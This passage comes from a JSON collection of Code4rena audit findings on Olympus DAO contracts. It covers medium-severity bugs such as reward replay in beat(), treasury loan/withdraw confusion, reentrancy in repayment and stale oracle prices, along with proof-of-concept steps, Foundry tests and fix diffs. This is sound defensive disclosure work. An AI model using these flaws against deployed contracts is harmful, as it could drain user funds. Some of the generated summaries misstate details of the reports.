on [#405](https://github.com/code-423n4/2022-08-olympus-findings/issues/405#issuecomment-1239878294). This approach actually solves both of our issues though.\n\n**[0xean (judge) commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/79#issuecomment-1251018524):**\n > Going to use this issue as the primary since the solution is elegant and solves the problem. \n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the `beat()` function of the Heart.sol code. This function is used to update prices and do other operations related to the bond market. Users are rewarded for running this function, however, if it has not been run in the last `frequency()` period, a user could call it multiple times in a row and receive multiple rewards. The recommended mitigation step for this vulnerability is to change line 103 of the Heart.sol code to `lastBeat = block.timestamp - (block.timestamp - lastBeat) % frequency();`. This will ensure that the `beat()` function can only be called once per `frequency()` period.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "https://github.com/code-423n4/2022-08-olympus-findings/issues/79",
      "tags": [],
      "finders": [
        "Trust",
        "datapunk",
        "Jeiwan",
        "devtooligan",
        "Lambda",
        "itsmeSTYJ",
        "zzzitron",
        "rvierdiiev"
      ]
    },
    {
      "id": "3233",
      "title": "[M-29] TRSRY susceptible to loan / withdraw confusion",
      "impact": "MEDIUM",
      "content": "_Submitted by Trust, also found by 0xSky, datapunk, and tonisives_\n\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L64-L102><br>\n\nTreasury allocates approvals in the withdrawApproval mapping which is set via setApprovalFor(). In both withdrawReserves() and in getLoan(), \\_checkApproval() is used to verify user has enough approval and subtracts the withdraw / loan amount. Therefore, there is no differentiation in validation between loan approval and withdraw approval. Policies which will use getLoan() (currently none) can simply withdraw the tokens without bookkeeping it as a loan.\n\n### Proof of Concept\n\n1.  Policy P has getLoan permission\n2.  setApprovalFor(policy, token, amount) was called to grant P permission to loan amount\n3.  P calls withdrawReserves(address, token, amount) and directly withdraws the funds without registering as loan\n\n### Recommended Mitigation Steps\n\nA separate mapping called loanApproval should be implemented, and setLoanApprovalFor() will set it, getLoan() will reduce loanApproval balance.\n\n**[ind-igo (Olympus) confirmed, but disagreed with severity and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/75#issuecomment-1239657706):**\n > Confirmed. Good suggestion. Would put as low risk though.\n\n**[0xean (judge) commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/75#issuecomment-1250396074):**\n > Currently thinking Medium is appropriate for this issue, but will circle back on it. \n\n**[0xean (judge) commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/75#issuecomment-1251404052):**\n > See [#293](https://github.com/code-423n4/2022-08-olympus-findings/issues/293) for a possible vector in which this could lead to loss of funds.  Going to leave as Medium.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the code of a software system. The code in question is located at the GitHub link provided, and the vulnerability allows users with the permission to take out a loan to directly withdraw funds without registering it as a loan. This could have serious financial implications for the system. \n\nThe proof of concept provided in the report outlines how the vulnerability could be exploited. The recommended mitigation steps suggest implementing a separate mapping called loanApproval and creating two new functions, setLoanApprovalFor() and getLoan(), to set and reduce the loanApproval balance, respectively. This would ensure that any loans taken out are properly registered and tracked. \n\nIn conclusion, this bug report outlines a vulnerability in the code of a software system that could have serious financial implications if exploited. The recommended mitigation steps provided in the report should be implemented to ensure that any loans taken out are properly registered and tracked.",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "https://github.com/code-423n4/2022-08-olympus-findings/issues/75",
      "tags": [
        "Business Logic",
        "Approve"
      ],
      "finders": [
        "tonisives",
        "Trust",
        "0xSky",
        "datapunk"
      ]
    },
    {
      "id": "3232",
      "title": "[M-28] Activating same Policy multiple times in Kernel possible",
      "impact": "MEDIUM",
      "content": "_Submitted by Lambda, also found by enckrish_\n\n<https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/Kernel.sol#L296><br>\n\nTo check that an already active policy is not added a second time, `isActive()` is called on the policy. However, `policy` could be a malicious contract that always returns `false` for `isActive()`. In such a scenario, it would be possible to activate the policy multiple times for the same Kernel. This would break uniqueness invariants such that `_deactivatePolicy()` no longer works. However, it could also be used for a DoS attack: As `_reconfigurePolicies` and `_migrateKernel` iterate over those lists that now contain duplicates, they could run out of gas if a policy is activated enough times.\n\n### Recommended Mitigation Steps\n\nCheck `getPolicyIndex[policy_] != 0` instead of relying on a value of an untrusted contract.\n\n**[0xLienid (Olympus) commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/52#issuecomment-1238281166):**\n > @ind-igo a few other submissions also mention problems with over-reliance on policy.isActive (i.e. [#368](https://github.com/code-423n4/2022-08-olympus-findings/issues/368)). Might be worth mitigating with the suggested step here or the check on activePolicies[index] like 368 mentions.\n\n**[ind-igo (Olympus) commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/52#issuecomment-1241161485):**\n > Dupe of #368 \n\n**[0xean (judge) commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/52#issuecomment-1251630127):**\n > I think this is separate from #368 which is about a policy deactivating that isn't already active. \n> \n> I am a bit skeptical at the impact statement currently, but it does seem like protocol functionality does end up in a bad state with the typical policy lifecycle here. Will award as Medium unless Sponsor wants to provide some additional reasoning as to a downgrade. \n\n**[ind-igo (Olympus) commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/52#issuecomment-1271829178):**\n > While the issue is slightly different from #368, the solution is the exact same. The remediation has the new checks to prevent both of these issues.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the code of the project \"2022-08-olympus\". The vulnerability can be exploited to activate a policy multiple times for the same Kernel. This would break the uniqueness invariants and could be used for a DoS attack. The recommended mitigation step is to check that `getPolicyIndex[policy_] != 0` instead of relying on a value of an untrusted contract. This would prevent the policy from being activated multiple times.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "https://github.com/code-423n4/2022-08-olympus-findings/issues/52",
      "tags": [],
      "finders": [
        "Lambda",
        "enckrish"
      ]
    },
    {
      "id": "3231",
      "title": "[M-27] Unexecutable proposals when `Actions.MigrateKernel` is not last instruction",
      "impact": "MEDIUM",
      "content": "_Submitted by Lambda_\n\n<https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/INSTR.sol#L61><br>\n\nIn `INSTR.sol`, it is correctly checked that a `ChangeExecutor` instruction only occurs at the last position to avoid situations where the other instructions are deemed as invalid.<br>\nHowever, the same problem can occur for `MigrateKernel`. For instance, let's say we have a `MigrateKernel` followed by a `DeactivatePolicy` action. The `MigrateKernel` action will change the value of `kernel` within the policy. The `DeactivatePolicy` action tries to call `setActiveStatus` on the policy. However, this has a `onlyKernel` modifier and the call will therefore fail when it is done after the value of `kernel` was changed.\n\n### Recommended Mitigation Steps\n\nPerform the same check for `MigrateKernel`.\n\n**[fullyallocated (Olympus) confirmed and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/51#issuecomment-1236245145):**\n > Thank you; good catch\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability found in the INSTR.sol file of the code-423n4/2022-08-olympus repository. The vulnerability occurs when a MigrateKernel action is followed by a DeactivatePolicy action. This can cause the call to setActiveStatus on the policy to fail as the value of kernel has been changed. The recommended mitigation step is to perform the same check for MigrateKernel as is done for ChangeExecutor instruction.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "https://github.com/code-423n4/2022-08-olympus-findings/issues/51",
      "tags": [],
      "finders": [
        "Lambda"
      ]
    },
    {
      "id": "3230",
      "title": "[M-26] Cushion bond markets are opened at wall price rather than current price",
      "impact": "MEDIUM",
      "content": "_Submitted by 0x52_\n\n<https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L363-L469><br>\n\nIncorrect initial bond market price.\n\n### Proof of Concept\n\n    uint256 initialPrice = range.wall.high.price.mulDiv(bondScale, oracleScale);\n\n    uint256 initialPrice = invWallPrice.mulDiv(bondScale, oracleScale);\n\nIn the above lines the initial prices are set to the wall price rather than the current price as indicated in documentation.\n\n### Recommended Mitigation Steps\n\nInitial price should be updated to open bond market at current price rather than wall price.\n\n**[Oighty (Olympus) disagreed with severity and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/485#issuecomment-1235667143):**\n > This is more of a design decision than a bug. However, we did make this change in the code prior to the audit (it didn't get reflected in the repo). @ind-igo not sure how you want to handle.\n\n**[0xean (judge) commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/485#issuecomment-1251683341):**\n > Going to award as Medium assuming no additional input from sponsor on the topic. \n\n**[Oighty (Olympus) commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/485#issuecomment-1252616779):**\n > It does deviate from the spec so I guess that's appropriate. The system actually would work as-is, but would be less responsive to price movements into the cushions since the bond market would have to decay (which requires waiting) to reach the current market price vs. instantly providing a buy/sell at the current price.\n\n\n\n***\n\n",
      "summary": "\nA bug has been identified in the Operator.sol file of the 2022-08-olympus GitHub repository. This bug could cause incorrect initial bond market prices. The bug is located in lines 363-469 of the file. The incorrect initial price is set to the wall price rather than the current price as indicated in the documentation. The recommended mitigation step is to update the initial price to open the bond market at the current price rather than the wall price.",
      "quality_score": 3,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "https://github.com/code-423n4/2022-08-olympus-findings/issues/485",
      "tags": [
        "Business Logic"
      ],
      "finders": [
        "0x52"
      ]
    },
    {
      "id": "3229",
      "title": "[M-25] Moving average precision is lost",
      "impact": "MEDIUM",
      "content": "_Submitted by hyh, also found by CertoraInc, d3e4, and rbserver_\n\nNow the precision is lost in moving average calculations as the difference is calculated separately and added each time, while it typically can be small enough to lose precision in the division involved.\n\nFor example, `10000` moves of `990` size, `numObservations = 1000`. This will yield `0` on each update, while must yield `9900` increase in the moving average.\n\n### Proof of Concept\n\nMoving average is calculated with the addition of the difference:\n\n<https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L134-L139>\n\n```solidity\n        // Calculate new moving average\n        if (currentPrice > earliestPrice) {\n            _movingAverage += (currentPrice - earliestPrice) / numObs;\n        } else {\n            _movingAverage -= (earliestPrice - currentPrice) / numObs;\n        }\n```\n\n`/ numObs` can lose precision as `currentPrice - earliestPrice` is usually small.\n\nIt is returned on request as is:\n\n<https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L189-L193>\n\n```solidity\n    /// @notice Get the moving average of OHM in the Reserve asset over the defined window (see movingAverageDuration and observationFrequency).\n    function getMovingAverage() external view returns (uint256) {\n        if (!initialized) revert Price_NotInitialized();\n        return _movingAverage;\n    }\n```\n\n### Recommended Mitigation Steps\n\nConsider storing the cumulative `sum`, while returning `sum / numObs` on request:\n\n<https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L189-L193>\n\n```solidity\n    /// @notice Get the moving average of OHM in the Reserve asset over the defined window (see movingAverageDuration and observationFrequency).\n    function getMovingAverage() external view returns (uint256) {\n        if (!initialized) revert Price_NotInitialized();\n-       return _movingAverage;\n+       return _movingAverage / numObservations;\n    }\n```\n\n**[Oighty (Olympus) disagreed with severity and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/483#issuecomment-1238433469):**\n > Keeping track of the observations as a sum and then dividing is a good suggestion. The price values have 18 decimals and the max discrepancy introduced is very small (10**-15) with expected parameter ranges. The potential risk to the protocol seems low though.\n\n**[hyh (warden) commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/483#issuecomment-1240994248):**\n > Please notice that discrepancy here is unbounded, i.e. the logic itself does not have any max discrepancy, the divergence between fact and recorded value can pile up over time without a limit.\n> \n> If you do imply that markets should behave in some way that minuses be matched with pluses, then I must say that they really shouldn't.\n\n**[Oighty (Olympus) confirmed](https://github.com/code-423n4/2022-08-olympus-findings/issues/483)**\n\n**[0xean (judge) commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/483#issuecomment-1249930031):**\n > Debating between QA and Medium on this one. I am going to award it as medium because there is a potential to leak some value due to this imprecision compounding over time. \n\n\n\n***\n\n",
      "summary": "\nA bug report has been issued for the code found in the GitHub repository https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L134-L139. The vulnerability is that the precision is lost in moving average calculations as the difference is calculated separately and added each time, while it typically can be small enough to lose precision in the division involved. It is demonstrated with an example of `10000` moves of `990` size, `numObservations = 1000` which should yield `9900` increase in the moving average, but instead yields `0`.\n\nThe bug report suggests that the cumulative `sum` should be stored, while returning `sum / numObs` on request. This can be achieved by replacing the `return _movingAverage` line in the code with the line `return _movingAverage / numObservations`. This change should prevent the precision from being lost and ensure the moving average is calculated correctly.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "https://github.com/code-423n4/2022-08-olympus-findings/issues/483",
      "tags": [
        "Precision Loss"
      ],
      "finders": [
        "CertoraInc",
        "d3e4",
        "hyh",
        "rbserver"
      ]
    },
    {
      "id": "3228",
      "title": "[M-24] [NAZ-M1] Chainlink's `latestRoundData` Might Return Stale Results",
      "impact": "MEDIUM",
      "content": "_Submitted by 0xNazgul, also found by &#95;&#95;141345&#95;&#95;, 0x1f8b, ak1, brgltd, cccz, csanuragjain, Dravee, Guardian, hyh, IllIllI, itsmeSTYJ, Jujic, Lambda, pashov, peachtea, rbserver, reassor, Sm4rty, TomJ, and zzzitron_\n\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L161><br>\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L170><br>\n\nAcross these contracts, you are using Chainlink's `latestRoundData` API, but there is only a check on `updatedAt`. This could lead to stale prices according to the Chainlink documentation:\n\n*   [Historical Price data](https://docs.chain.link/docs/historical-price-data/#historical-rounds)\n*   [Checking Your returned answers](https://docs.chain.link/docs/faq/#how-can-i-check-if-the-answer-to-a-round-is-being-carried-over-from-a-previous-round)\n\nThe result of `latestRoundData` API will be used across various functions, therefore, a stale price from Chainlink can lead to loss of funds to end-users.\n\n### Recommended Mitigation Steps\n\nConsider adding the missing checks for stale data.\n\nFor example:\n\n```js\n(uint80 roundID ,answer,, uint256 timestamp, uint80 answeredInRound) = AggregatorV3Interface(chainLinkAggregatorMap[underlying]).latestRoundData();\n\nrequire(answer > 0, \"Chainlink price <= 0\"); \nrequire(answeredInRound >= roundID, \"Stale price\");\nrequire(timestamp != 0, \"Round not complete\");\n```\n\n**[Oighty (Olympus) confirmed and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/441#issuecomment-1238528515):**\n > Agree. We'll add the additional checks.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability that could lead to loss of funds to end-users. The vulnerability is caused by the use of Chainlink's `latestRoundData` API without a check on `updatedAt`. This could lead to the use of stale prices across various functions. Manual review was used to detect the vulnerability. To mitigate this vulnerability, it is recommended to add checks for stale data, such as checking that the answer to a round is being carried over from a previous round, and that the round is complete. This should ensure that the correct, up-to-date data is used.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "https://github.com/code-423n4/2022-08-olympus-findings/issues/441",
      "tags": [
        "Oracle",
        "Chainlink",
        "Stale Price"
      ],
      "finders": [
        "Jujic",
        "brgltd",
        "pashov",
        "0xNazgul",
        "Guardian",
        "rbserver",
        "TomJ",
        "Lambda",
        "itsmeSTYJ",
        "0x1f8b",
        "Sm4rty",
        "csanuragjain",
        "IllIllI",
        "reassor",
        "cccz",
        "peachtea",
        "zzzitron",
        "ak1",
        "__141345__",
        "Dravee",
        "hyh"
      ]
    },
    {
      "id": "3227",
      "title": "[M-23] Treasury module is vulnerable to cross-contract reentrancy",
      "impact": "MEDIUM",
      "content": "_Submitted by Czar102_\n\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L108-L112><br>\n\nAn attacker can pay back their loan to the treasury module with protocol-owned tokens. This will cause their loan to decrease despite the protocol won't be given funds for it.\n\n### Proof of Concept\n\nThe code first measures the number of tokens in the treasury, then transfers an amount to the contract and checks the change it caused. This is put behind a nonReentrant modifier so that one can't use the same balance change to pay back multiple parts of (potentially) multiple loans.\n\nThe problem arises when the treasury doesn't only claim tokens from paying back loans, but also claims protocol revenue. Since, an attacker can gain execution in the moment the funds are pulled to the treasury to trigger any function that grants treasury this type of tokens (collects protocol revenue). The contract will count these tokens as paying back one's loan since this happened between balance measurements.\n\n### Recommended Mitigation Steps\n\nAdd a function used to pull a token to the contract and mark it nonReentrant. Any transfer of tokens to the treasury should be done through that function.\n\n**[ind-igo (Olympus) commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/426#issuecomment-1240219578):**\n > I am confused by this submission. Need more information.\n\n**[ind-igo (Olympus) confirmed and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/426#issuecomment-1244569278):**\n > Spoke with Czar, solution for minimal change is adding `received = min(received, amount_); `. Confirming issue.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in a code that allows an attacker to pay back their loan to the treasury module with protocol-owned tokens without the protocol receiving funds for it. This is possible because the code measures the number of tokens in the treasury, then transfers an amount to the contract and checks the change it caused. This is put behind a nonReentrant modifier so that one can't use the same balance change to pay back multiple parts of (potentially) multiple loans.\n\nThe vulnerability arises when the treasury doesn't only claim tokens from paying back loans, but also claims protocol revenue. An attacker can gain execution in the moment the funds are pulled to the treasury to trigger any function that grants treasury this type of tokens (collects protocol revenue). The contract will count these tokens as paying back one's loan since this happened between balance measurements.\n\nThe recommended mitigation is to add a function used to pull a token to the contract and mark it nonReentrant. Any transfer of tokens to the treasury should be done through that function.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "https://github.com/code-423n4/2022-08-olympus-findings/issues/426",
      "tags": [],
      "finders": [
        "Czar102"
      ]
    },
    {
      "id": "3226",
      "title": "[M-22] Low market bonds/swaps not working after loan is taken from treasury",
      "impact": "MEDIUM",
      "content": "_Submitted by immeas_\n\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L60><br>\n\nI am bordering between this being medium and low, but since this is, granted under very unlikely circumstances, hindering intended transfers to work I am submitting it as medium. That said, I don't think this scenario is very likely since it requires a trusted contract not part of initial release(? no contract in repo used a loan) to take a large loan from TRSRY.\n\n### Proof of Concept\n\nThis will cause test to fail on `TRANSFER_FAILED` due to TRSRY not having the tokens to transfer but `getReserveBalance` says it has, since capacity is determined based on non-existing tokens.\n\n```diff\ndiff --git a/src/test/policies/Operator.t.sol b/src/test/policies/Operator.t.sol\nindex e09aec1..5c1e95f 100644\n--- a/src/test/policies/Operator.t.sol\n+++ b/src/test/policies/Operator.t.sol\n@@ -26,6 +26,8 @@ import {OlympusMinter, OHM} from \"modules/MINTR.sol\";\n import {Operator} from \"policies/Operator.sol\";\n import {BondCallback} from \"policies/BondCallback.sol\";\n \n+import {ModuleTestFixtureGenerator} from \"test/lib/ModuleTestFixtureGenerator.sol\";\n+\n contract MockOhm is ERC20 {\n     constructor(\n         string memory _name,\n@@ -45,6 +47,7 @@ contract MockOhm is ERC20 {\n // solhint-disable-next-line max-states-count\n contract OperatorTest is Test {\n     using FullMath for uint256;\n+    using ModuleTestFixtureGenerator for OlympusTreasury;\n \n     UserFactory public userCreator;\n     address internal alice;\n@@ -53,6 +56,9 @@ contract OperatorTest is Test {\n     address internal policy;\n     address internal heart;\n \n+    address public debtor;\n+    address public godmode; \n+\n     RolesAuthority internal auth;\n     BondAggregator internal aggregator;\n     BondFixedTermTeller internal teller;\n@@ -187,6 +193,18 @@ contract OperatorTest is Test {\n \n         reserve.mint(address(treasury), testReserve * 100);\n \n+        debtor = treasury.generateFunctionFixture(treasury.getLoan.selector);\n+        godmode = treasury.generateGodmodeFixture(type(OlympusTreasury).name);\n+        \n+        kernel.executeAction(Actions.ActivatePolicy, godmode);\n+        kernel.executeAction(Actions.ActivatePolicy, debtor);\n+        \n+        vm.prank(godmode);\n+        treasury.setApprovalFor(debtor, reserve, testReserve * 100);\n+\n+        vm.prank(debtor);\n+        treasury.getLoan(reserve,testReserve*100);\n+\n         // Approve the operator and bond teller for the tokens to swap\n         vm.prank(alice);\n         ohm.approve(address(operator), testOhm * 20);\n```\n\nSame is applicable for low market bonds since they are created based on the same capacity.\n\n### Tools Used\n\nvs code + tests\n\n### Recommended Mitigation Steps\n\nDetermine capacity from actual tokens held by treasury.\n\n**[ind-igo (Olympus) confirmed and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/422#issuecomment-1238768525):**\n > Acknowledged. Will add a reserve requirement check inside the TRSRY's debt functions, which we can expand with a policy to rebalance if out of balance on a heartbeat.\n\n\n\n***\n\n",
      "summary": "\nA bug was discovered in the code of a GitHub repository, which affects the functioning of low market bonds/swaps after a loan is taken from the TRSRY. This bug is considered low in impact as it is unlikely to occur, but it still hinders the intended transfers. The bug was discovered when a test failed on TRANSFER_FAILED due to TRSRY not having the tokens to transfer, though the 'getReserveBalance' said it had, since capacity was determined based on non-existing tokens. The tools used to identify this bug were VS Code and tests.\n\nThe recommended mitigation step to fix this bug is to determine capacity from the actual tokens held by the treasury.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "https://github.com/code-423n4/2022-08-olympus-findings/issues/422",
      "tags": [],
      "finders": [
        "immeas"
      ]
    },
    {
      "id": "3225",
      "title": "[M-21] OlympusGovernance - active proposal does not expire",
      "impact": "MEDIUM",
      "content": "_Submitted by reassor_\n\nContract `OlympusGovernance` allows controlling protocol through on-chain governing. The issue is that once proposal is active it does not expire, which means that until the new proposal will be selected, anyone can vote on existing one and potentially execute it when it might cause harm to the protocol.\n\nScenario:\n\n1.  New proposal has been submited, endorsed and activated.\n2.  Users vote, but the quroum is not being achieved.\n3.  The proposal is active until new one is getting submitted.\n4.  6 months elapses and the current active proposal might cause serious harm to the protocol (since it was created long time ago).\n5.  Malicious actor votes and executes proposal causing harm to the protocol.\n\n### Proof of Concept\n\n`Governance.sol`:\n\n*   <https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L265-L289>\n\n### Tools Used\n\nManual Review / VSCode\n\n### Recommended Mitigation Steps\n\nIt is recommended to add expiration for the active proposal for example 2 weeks. After that time it should be possible to reject proposal and users should be able to reclaim VOTES tokens.\n\n**[fullyallocated (Olympus) disputed](https://github.com/code-423n4/2022-08-olympus-findings/issues/100)**\n\n**[0xean (judge) commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/100#issuecomment-1251712619):**\n > I believe the warden is simply stating that an active proposal stays active if not replaced.  There is not expiration of a proposal once it becomes active, so theoretically if the governance process is inactive a very stale proposal could get executed. \n\n\n\n***\n\n",
      "summary": "\nThis bug report is about the vulnerability in Contract OlympusGovernance which allows controlling protocol through on-chain governing. The issue is that once a proposal is active, it does not expire, meaning that until a new proposal is selected, anyone can vote on the existing one and potentially execute it when it might cause harm to the protocol. \n\nA proof of concept example is given in which a malicious actor votes and executes a proposal causing harm to the protocol. The lines of code associated with the vulnerability are provided in the report and it is recommended to add an expiration for the active proposal, for example two weeks, so that users can reclaim their VOTES tokens. \n\nIn conclusion, this bug report is about a vulnerability in Contract OlympusGovernance which allows anyone to vote on and execute a proposal which might have been active for a long time and cause harm to the protocol. It is recommended to add an expiration period for active proposals to mitigate this vulnerability.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "https://github.com/code-423n4/2022-08-olympus-findings/issues/100",
      "tags": [],
      "finders": [
        "reassor"
      ]
    },
    {
      "id": "3224",
      "title": "[M-20] Operator: if WallSpread is 10000, `operate` and `beat` will revert and price information cannot be updated anymore",
      "impact": "MEDIUM",
      "content": "_Submitted by zzzitron_\n\nThe `beat` cannot be called anymore and price information will not be updated\n\nCondition:\n\n*   the wallspread is set to 10000 (100%)\n*   lower wall is active (range.low\\.active==true)\n*   the price falls into the lower cushion (currentPrice < range.cushion.low\\.price && currentPrice > range.wall.low\\.price), therefore activates the lower bond market\n\n### Proof of Concept\n\nThe below proof of concept demonstrates that the `operate` will revert with 100% wallspread. The full test code can be found [here](https://gist.github.com/zzzitron/74dfbc0249151a682061cd6532628d87) as well as [the diff from `Operator.t.sol`](https://gist.github.com/zzzitron/216d67cc0c7def5450b921f9c7f9ae91).\n\nIn the test, the wallspread was set to 10000, which is 100% (line 51). The price was set so that the lower market should be deployed (line 59). In the market deployment logic (`Operator::_activate`) will revert due to division by zero, and `operate` will fail.\n\nOnce this condition is met, the `operate` cannot be called and `Heart::beat` cannot be called as well, since the `Heart::beat` is calling `Operator::opearate` under the hood. As the result the price can never be updated. But other codes who uses the price information will not know that the price information is stale. If the upper wall is active and still have the capacity, one can swap from the upper wall using the stale information, which might cause some loss of funds.\n\n```solidity\n    function test_poc__lowCushionDeployWithWallspread10000Reverts() public {\n        /// Initialize operator\n        vm.prank(guardian);\n        operator.initialize();\n\n        /// if the wallspread is 10000 the operate might revert\n        vm.prank(policy);\n        operator.setSpreads(7000, 10000);\n\n        /// Confirm that the cushion is not deployed\n        assertTrue(!auctioneer.isLive(range.market(true)));\n\n        /// Set price on mock oracle into the lower cushion\n        /// given the lower wallspread is 10000\n        /// when the lower market should be deployed the operate reverts\n        price.setLastPrice(20 * 1e18);\n\n        /// Trigger the operate function manually\n        /// The operate will revert Error with \"Division or modulo by 0\"\n        /// But I could not figure out to catch with `expectRevert`\n        /// so just commenting out the assert\n        // vm.prank(guardian);\n        // /// vm.expectRevert(bytes(\"Division or module by 0\"));   // this cannot catch the revert...\n        // operator.operate();\n    }\n```\n\n### Cause\n\nThe main cause is that the `RANGE::setSpreads` function fails to check for `wallSpread_ == 10000`. If the setter does not allow the wallSpread to be 100%, the price of the lower wall will not go to zero.\n\n```solidity\n// modules/RANGE.sol\n// https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/RANGE.sol#L242-L250\n\n242     function setSpreads(uint256 cushionSpread_, uint256 wallSpread_) external permissioned {\n243         // Confirm spreads are within allowed values\n244         if (\n245             wallSpread_ > 10000 ||\n246             wallSpread_ < 100 ||\n247             cushionSpread_ > 10000 ||\n248             cushionSpread_ < 100 ||\n249             cushionSpread_ > wallSpread_\n250         ) revert RANGE_InvalidParams();\n```\n\nIn the `RANGE::updatePrices`, the price of lower wall will be zero if the wallSpread is 100%.\nIf the price of lower wall is zero, the `Operator::_activate` will fail for the lower cushion.\n\n```solidity\n// policies/Operator.sol::_activate(bool high_)\n// when high_ is false\n421             uint256 invWallPrice = 10**(oracleDecimals * 2) / range.wall.low.price;\n\n// modules/RANGE.sol::updatePrices\n164         _range.wall.low.price = (movingAverage_ * (FACTOR_SCALE - wallSpread)) / FACTOR_SCALE;\n```\n\n### Tools Used\n\nFoundry\n\n### Recommended Mitigation Steps\n\nMitigation suggestion: line 245. Forbid wallSpread to be 100%.\n\n```solidity\n// modules/RANGE.sol\n// https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/RANGE.sol#L242-L250\n\n242     function setSpreads(uint256 cushionSpread_, uint256 wallSpread_) external permissioned {\n243         // Confirm spreads are within allowed values\n244         if (\n-245            wallSpread_ > 10000 ||\n+               wallSpread_ >= 10000 ||\n246             wallSpread_ < 100 ||\n247             cushionSpread_ > 10000 ||\n248             cushionSpread_ < 100 ||\n249             cushionSpread_ > wallSpread_\n250         ) revert RANGE_InvalidParams();\n```\n\n**[Oighty (Olympus) disagreed with severity and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/404#issuecomment-1238554404):**\n > This is indeed an edge case and we will update the value checks for the spread values to exclude `10000`. However, from a practical perspective, this is very unlikely to happen. If the goal is to set the lower wall to 0, then the system would just be disabled.\n\n**[0xean (judge) commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/404#issuecomment-1251657272):**\n > Given the warden does fully demonstrate the issue, I am going to award as Medium with the understanding that this is an extreme edge case. \n\n\n\n***\n\n",
